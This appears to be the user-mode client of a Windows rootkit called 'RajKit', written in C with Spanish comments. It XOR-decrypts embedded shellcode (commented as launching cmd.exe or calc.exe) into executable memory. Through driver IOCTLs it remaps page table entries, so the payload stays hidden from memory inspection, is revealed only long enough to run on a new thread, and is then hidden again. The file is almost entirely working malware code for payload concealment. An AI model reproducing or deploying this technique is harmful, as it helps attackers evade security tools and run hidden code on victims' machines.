#include "stdafx.h"
#include "windows.h"
#include <stdio.h>
#include "winioctl.h"
#include "RajKit_USER.h"
#include <wchar.h>
#include <stdlib.h>

/*
"\n	    //////////////  //////////////	  //////////    //////   ////    /////////     ////////////// \n"
"\n		/////     ///  /////	/////	    ////	   //////   ////      //////		  /////\n"
"\n		////////////   ////		////	   ////       /////////////       /////			 /////\n"
"\n		///////////// /////////////		  /////	     /////////////////   /////			/////\n"
"\n		////     /// /////	  ////	///  /////      //////       ////   /////		   /////\n"
"\n		///     ///  /////	 ////  //////////      //////      /////  ////////	      /////\n"
*/

#define SIOCTL_TYPE 40000

#define IOCTL_PTE_INIT_1 CTL_CODE( SIOCTL_TYPE, 0x820, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_PTE_INIT_2 CTL_CODE( SIOCTL_TYPE, 0x821, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_PTE_UNDO CTL_CODE( SIOCTL_TYPE, 0x822, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_PTE_REDO CTL_CODE( SIOCTL_TYPE, 0x823, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)

#pragma warning(disable : 4245 4127 4838 4309 )

char key[] = "RajKit";

//execute cmd.exe XOR^[RajKit]
//calc.exe XOR^[Rajkit]
unsigned char shellcode[] =
/*"\xAE\x29\xE9\xAF\x99\x9C\x92\x61\x6A\x4B\x28\x25\x13\x31\x38\x1A\x3F\x3C"
"\x63\xB3\x0F\x03\xE2\x26\x32\x29\xE1\x19\x71\x3C\xD9\x33\x4A\x03\xE2\x06"
"\x02\x29\x65\xFC\x23\x3E\x1F\x50\xA3\x03\x58\xB4\xFE\x5D\x0B\x37\x6B\x58"
"\x72\x20\xAB\x82\x64\x35\x53\xA0\x88\xA6\x3B\x35\x03\x29\xE1\x19\x49\xFF"
"\x10\x5D\x22\x4A\xB9\xFF\xD2\xE9\x6A\x4B\x69\x3C\xD7\xA1\x1E\x2C\x21\x75"
"\x82\x31\xE1\x03\x71\x30\xD9\x21\x4A\x02\x68\xA4\xB1\x37\x22\xB4\xA0\x35"
"\xD9\x55\xE2\x03\x68\xA2\x1F\x50\xA3\x03\x58\xB4\xFE\x20\xAB\x82\x64\x35"
"\x53\xA0\x52\xAB\x1C\x85\x1E\x62\x26\x6F\x61\x31\x6B\xB0\x1F\x93\x31\x30"
"\xD9\x21\x4E\x02\x68\xA4\x34\x20\xE1\x47\x21\x30\xD9\x21\x76\x02\x68\xA4"
"\x13\xEA\x6E\xC3\x21\x75\x82\x20\x32\x0A\x31\x2A\x0B\x3B\x2B\x13\x28\x2D"
"\x13\x3B\x22\xC8\x85\x54\x13\x33\x95\xAB\x31\x35\x0B\x3B\x22\xC0\x7B\x9D"
"\x05\x9E\x95\xB4\x34\x3C\xE8\x60\x6A\x4B\x69\x74\x52\x61\x6A\x03\xE4\xF9"
"\x53\x60\x6A\x4B\x28\xCE\x63\xEA\x05\xCC\x96\xA1\xE9\x91\xDF\xE9\x3F\x35"
"\xE8\xC7\xFF\xF6\xF4\x8B\x87\x29\xE9\x8F\x41\x48\x54\x1D\x60\xCB\x92\x94"
"\x27\x64\xD1\x0C\x7A\x06\x3D\x0B\x6A\x12\x28\xFD\x88\x9E\xBF\x28\x04\x10"
"\x7C\x04\x12\x2E\x69\x74";*/
"\xAE\x29\xE9\xAF\x99\x9C\x92\x61\x6A\x4B\x28\x25\x13\x31\x38\x1A\x3F\x3C"
"\x63\xB3\x0F\x03\xE2\x26\x32\x29\xE1\x19\x71\x3C\xD9\x33\x4A\x03\xE2\x06"
"\x02\x29\x65\xFC\x23\x3E\x1F\x50\xA3\x03\x58\xB4\xFE\x5D\x0B\x37\x6B\x58"
"\x72\x20\xAB\x82\x64\x35\x53\xA0\x88\xA6\x3B\x35\x03\x29\xE1\x19\x49\xFF"
"\x10\x5D\x22\x4A\xB9\xFF\xD2\xE9\x6A\x4B\x69\x3C\xD7\xA1\x1E\x2C\x21\x55"
"\x82\x31\xE1\x03\x71\x30\xD9\x21\x4A\x02\x68\xA4\xB1\x37\x22\xB4\xA0\x35"
"\xD9\x55\xE2\x03\x68\xA2\x1F\x50\xA3\x03\x58\xB4\xFE\x20\xAB\x82\x64\x35"
"\x53\xA0\x52\xAB\x1C\x85\x1E\x62\x26\x6F\x61\x31\x6B\xB0\x1F\x93\x31\x30"
"\xD9\x21\x4E\x02\x68\xA4\x34\x20\xE1\x47\x21\x30\xD9\x21\x76\x02\x68\xA4"
"\x13\xEA\x6E\xC3\x21\x75\x82\x20\x32\x0A\x31\x2A\x0B\x3B\x2B\x13\x28\x2D"
"\x13\x3B\x22\xC8\x85\x54\x13\x33\x95\xAB\x31\x35\x0B\x3B\x22\xC0\x7B\x9D"
"\x05\x9E\x95\xB4\x34\x3C\xE8\x60\x6A\x4B\x69\x74\x52\x61\x6A\x03\xE4\xF9"
"\x53\x60\x6A\x4B\x28\xCE\x63\xEA\x05\xCC\x96\xA1\xE9\x91\xDF\xE9\x3F\x35"
"\xE8\xC7\xFF\xF6\xF4\x8B\x87\x29\xE9\x8F\x41\x48\x54\x1D\x60\xCB\x92\x94"
"\x27\x64\xD1\x0C\x7A\x06\x3D\x20\xE3\x91\x21\xF7\x96\x41\xA9\x28\x08\x18"
"\x31\x4F\x0F\x33\x0C\x74";

int keysize = sizeof(key) - 1;
int shellcode_size = sizeof(shellcode);
int shellcode_read = shellcode_size - 8;

VOID actionPTE(bool);
void prepare_answer(int);

HANDLE hProcess = NULL;
HANDLE hDevice = NULL;
bool doItLoop = true;
WCHAR switchChar;
DWORD dwBytesRead = 0;
#define readbuffer_size 1000
char ReadBuffer[readbuffer_size] = { 0 };

PVOID PTEmemPointer = 0x0000;
PVOID CLEANmemPointer = 0x0000;
DWORD oldProtection = NULL;

HANDLE PTEthread;

HIDING_INFO hidingInfo;
PHIDING_INFO pHidingInfo = &hidingInfo;

LPVOID pteStartAddress = 0;
LPVOID cleanPteStartAddress = 0;
LPVOID startAddress = 0x0000;
LPVOID endAddress = 0x0000;

int initial_protection = PAGE_READONLY;

DWORD64 memsize = 0x3000;
LPVOID shellcodeDestinationAddress = 0x0000;
#define answer_size 1000
char answer[answer_size];

/* La convención de llamada __cdecl crea archivos ejecutables mayores que __stdcall,
porque requiere que cada llamada a función incluya código de limpieza de la pila */
int __cdecl main()
{
	DWORD64 procID = GetCurrentProcessId();
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)procID);
	hidingInfo.PID = (int)procID;

	hDevice = CreateFile(L"\\\\.\\RajKit", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDevice == NULL) {
		printf("ERROR del handle al driver\n");
		return ERROR_INVALID_HANDLE;
	}

	printf("Identificador del driver: %p\n", hDevice);

	do
	{
		// BUCLE+SWITCH para elegir:

		printf("\n\nELIGE OPCION:\n"
			"      [O]-> Ocultar shellcode mediante Remapeo de PAGE TABLE ENTRY\n"
			"      [E]-> Ejecutar shellcode oculta\n");

		switchChar = _getwch();
		printf("\n\n");

		switch (switchChar)
		{

		case L'o'://Ocultar shellcode mediante remapeo de PTE
			actionPTE(true);
			break;

		case L'e':// ejecutar shellcode

			printf("\n\n ++++++++++++ EJECUTANDO SHELLCODE ++++++++++++\n\n");

			// PTE subversions
			if (pteStartAddress != 0) {

				// mostrar memoria
				DeviceIoControl(hDevice, IOCTL_PTE_UNDO, (LPVOID)NULL, 0, ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
				prepare_answer(dwBytesRead);
				//printf("Message received from kerneland : %s\n", answer);
				printf("DRIVER: %s\n", answer);

				char buffer[8];
				if (ReadProcessMemory(hProcess, (char*)pteStartAddress + shellcode_read, buffer, 8, NULL)) {
					printf("Ultimos 8 bytes antes de la ejecuccion: %llx\n", *((DWORD64*)buffer));
				}

				//VA->PTE->PFN
				//!pte VA -> !pfn PFN -> !db [pfn*0x1000] -> !vtop 0 VA

				// ejecutar shellcode
				printf("\nExecuting thread at %p\n", PTEmemPointer);
				PTEthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PTEmemPointer, NULL, 0, NULL);
				WaitForSingleObject(PTEthread, INFINITE);


				// ocultar memoria
				DeviceIoControl(hDevice, IOCTL_PTE_REDO, (LPVOID)NULL, 0, ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
				prepare_answer(dwBytesRead);
				printf("DRIVER: %s\n", answer);

				if (ReadProcessMemory(hProcess, (char*)pteStartAddress + shellcode_read, buffer, 8, NULL)) {
					printf("Ultimos 8 bytes despues de la ejecucion y reocultado: %llx\n", *((DWORD64*)buffer));
				}
			}
			break;

			return 0;
		default:
			printf("Esa opcion no existe \n\n");
		}
	} while (doItLoop);
}

// desencriptar shellcode en tiempo de ejecucion
//shellcode[i] ^ Rajkit
void enDecrypt(char* shellcodeDestinationAddress) {
	for (int i = 0; i < shellcode_size; i++)
		shellcodeDestinationAddress[i] = shellcodeDestinationAddress[i] ^ key[i % keysize];
}

void prepare_answer(int bytesread) {
	RtlZeroMemory(answer, answer_size);
	_snprintf_s(answer, answer_size, bytesread, "%s", ReadBuffer);
}

VOID actionPTE(bool pfn_scenario) {

	int vadsize = 0x1000;

	if (pteStartAddress == 0) {
		// PTE target memory
		pteStartAddress = VirtualAlloc((LPVOID)NULL, vadsize, MEM_RESERVE | MEM_COMMIT, initial_protection);

		if (pteStartAddress == NULL) {
			printf("PTE Memory allocation failed - base address: %p\n", pteStartAddress);
			return;
		}
		else {
			VirtualLock(pteStartAddress, vadsize);
			VirtualProtect(pteStartAddress, vadsize, PAGE_EXECUTE_READWRITE, &oldProtection);

			PTEmemPointer = pteStartAddress;

			//guardar el rango de direcciones para la transmision de datos
			hidingInfo.PTEtargetStartAddress = (DWORD64)pteStartAddress;
			hidingInfo.PTEtargetEndAddress = hidingInfo.PTEtargetStartAddress + (vadsize - 0x1000);
			printf("PTE start address: %llx\n", hidingInfo.PTEtargetStartAddress);
			printf("PTE end address: %llx\n", hidingInfo.PTEtargetEndAddress);

			// escribir shellcode en memoria
			memcpy(pteStartAddress, shellcode, shellcode_size);
			enDecrypt((char*)pteStartAddress);
		}

		/* Reserve la memoria que imita el código legítimo,
		Con nuestra reasignación de PFN modificada en Windows,
		esta memoria limpia el área no se utiliza actualmente. */
		cleanPteStartAddress = VirtualAlloc((LPVOID)NULL, vadsize, MEM_RESERVE | MEM_COMMIT, initial_protection);

		if (cleanPteStartAddress == NULL) {
			printf("FALLO RESERVARNDO MEMORIA - direccion base: %llx\n", (DWORD64)cleanPteStartAddress);
			return;
		}
		else {
			VirtualLock(cleanPteStartAddress, vadsize);

			CLEANmemPointer = cleanPteStartAddress;

			//almacenar el rango de direcciones para la transmisión de datos
			hidingInfo.cleanStartAddress = (DWORD64)cleanPteStartAddress;
			hidingInfo.cleanEndAddress = hidingInfo.cleanStartAddress + (vadsize - 0x1000);
			printf("CLEAN start address: %llx\n", hidingInfo.cleanStartAddress);
			printf("CLEAN end address: %llx\n", hidingInfo.cleanEndAddress);

			if (initial_protection == PAGE_READONLY) {
				VirtualProtect(cleanPteStartAddress, 0x1000, PAGE_READWRITE, &oldProtection);
				memset(cleanPteStartAddress, 0x42, 0x1000);
				VirtualProtect(cleanPteStartAddress, 0x1000, PAGE_READONLY, &oldProtection);
			}
			else
				memset(cleanPteStartAddress, 0x42, 0x1000);
		}
	}

	// leer datos de la memoria, los 8 ultimos bytes
	char buffer[8];
	if (ReadProcessMemory(hProcess, (char*)pteStartAddress + shellcode_read, buffer, 8, NULL)) {
		printf("Ultimos 8 bytes antes de la subversion: %llx\n", *((DWORD64*)buffer));
	}

	DeviceIoControl(hDevice, IOCTL_PTE_INIT_1, (LPVOID)pHidingInfo, sizeof(HIDING_INFO), ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
	prepare_answer(dwBytesRead);
	printf("DRIVER: %s\n", answer);

	if (pfn_scenario) {
		printf("\n\n ++++++++++++ Segunda parte del remapeo [ENTER]  ++++++++++++ \n\n");
		while (getchar() != '\n');
		//cambiamos permisos 0x1000 con proteccion READ-WRITE
		VirtualProtect(pteStartAddress, 0x1000, PAGE_READWRITE, &oldProtection);
		//escribimos
		memset(pteStartAddress, 0x42, 0x1000);
		//volvemos a cambiar permisos a READ ONLY
		VirtualProtect(pteStartAddress, vadsize, PAGE_READONLY, &oldProtection);

		DeviceIoControl(hDevice, IOCTL_PTE_INIT_2, (LPVOID)pHidingInfo, sizeof(HIDING_INFO), ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
		prepare_answer(dwBytesRead);
		printf("DRIVER: %s\n", answer);

		if (ReadProcessMemory(hProcess, (char*)pteStartAddress + shellcode_read, buffer, 8, NULL)) {
			printf("Ultimos 8 bytes despues de la subversion: %llx\n", *((DWORD64*)buffer));
		}
	}
}